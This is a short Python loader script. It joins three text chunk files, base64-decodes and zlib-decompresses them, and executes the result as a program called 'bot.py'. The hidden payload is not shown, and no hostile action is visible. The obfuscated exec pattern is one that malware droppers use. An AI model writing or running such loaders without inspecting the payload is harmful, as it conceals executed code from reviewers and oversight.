#!/usr/bin/env python3
import zlib, base64
from pathlib import Path
p = Path(__file__).resolve().parent
b64 = "".join((p / f"zchunk_{i}.txt").read_text().strip() for i in range(3))
code = zlib.decompress(base64.b64decode(b64)).decode("utf-8")
exec(compile(code, str(p / "bot.py"), "exec"), {"__name__": "__main__", "__file__": str(p / "bot.py")})
